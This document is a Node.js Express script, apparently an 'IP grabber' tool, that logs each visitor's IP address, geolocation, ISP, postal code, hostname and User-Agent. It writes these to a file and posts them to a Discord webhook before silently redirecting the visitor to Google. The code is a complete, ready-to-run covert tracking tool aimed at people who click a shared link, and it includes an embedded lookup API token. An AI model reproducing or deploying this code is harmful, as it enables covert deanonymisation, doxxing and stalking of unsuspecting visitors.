const express = require("express");
const axios = require("axios");
const fs = require("fs");
const app = express();

const WEBHOOK_URL = "Webhook"; // Replace with your Discord webhook URL
const REDIRECT_URL = "https://google.com"; // site u want them to redirect
const PORT = 1036; // CHANGE PORT

app.use(express.json());

async function getIPInfo(ip) {
    try {
        const response = await axios.get(`https://ipinfo.io/${ip}?token=954195f87d474d`);
        const data = response.data;

        return {
            ip: data.ip || "Unknown",
            hostname: data.hostname || "Unknown",
            city: data.city || "Unknown",
            region: data.region || "Unknown",
            country: data.country || "Unknown",
            location: data.loc || "Unknown",
            isp: data.org || "Unknown",
            postal: data.postal || "Unknown",
            timezone: data.timezone || "Unknown"
        };
    } catch (error) {
        console.error("Failed to fetch IP info:", error);
        return null;
    }
}

app.get("/", async (req, res) => {
    const realIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const cleanIP = realIP.replace(/^.*:/, ""); // Removes IPv6 wrapping

    const visitorInfo = await getIPInfo(cleanIP);
    
    if (!visitorInfo) {
        return res.status(500).send("Error fetching IP data.");
    }

    const logEntry = `
📌 Visitor Info:
IP: ${visitorInfo.ip}
Hostname: ${visitorInfo.hostname}
City: ${visitorInfo.city}
Region: ${visitorInfo.region}
Country: ${visitorInfo.country}
Location: ${visitorInfo.location}
ISP: ${visitorInfo.isp}
Postal Code: ${visitorInfo.postal}
Timezone: ${visitorInfo.timezone}
User-Agent: ${req.headers["user-agent"] || "Unknown"}

--------------------------------------------------
`;

    
    fs.appendFile("logs.txt", logEntry, (err) => {
        if (err) console.error("❌ Error writing to logs.txt:", err);
    });

    
    const embed = {
        username: "!NFO$E(", 
        avatar_url: "WEBHOOK URL", 
        embeds: [
            {
                title: "**🔍 System Alert**",
                description: "A **new visitor** has been logged into the system.\nDetails are as follows:",
                color: 16711680, 
                thumbnail: {
                    url: "https://i.imgur.com/AfFp7pu.png" 
                },
                fields: [
                    { name: "📡 IP Address", value: `\`${visitorInfo.ip}\``, inline: true },
                    { name: "🖥️ Hostname", value: `\`${visitorInfo.hostname}\``, inline: true },
                    { name: "🏙️ City", value: `\`${visitorInfo.city}\``, inline: true },
                    { name: "🌍 Region", value: `\`${visitorInfo.region}\``, inline: true },
                    { name: "🇨🇴 Country", value: `\`${visitorInfo.country}\``, inline: true },
                    { name: "📍 Location", value: `\`${visitorInfo.location}\``, inline: true },
                    { name: "📡 ISP", value: `\`${visitorInfo.isp}\``, inline: true },
                    { name: "📬 Postal Code", value: `\`${visitorInfo.postal}\``, inline: true },
                    { name: "⏰ Timezone", value: `\`${visitorInfo.timezone}\``, inline: true },
                    { name: "🖥️ User-Agent", value: `\`${req.headers["user-agent"] || "Unknown"}\``, inline: false }
                ],
                footer: {
                    text: "INFO$ez | Developed by Joem",
                    icon_url: "https://i.imgur.com/AfFp7pu.png"
                }
            }
        ]
    };

    
    axios.post(WEBHOOK_URL, embed)
        .then(() => console.log("📩 Visitor info sent to webhook!"))
        .catch(err => console.error("❌ Failed to send webhook:", err));

   
    res.redirect(REDIRECT_URL);
});

app.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
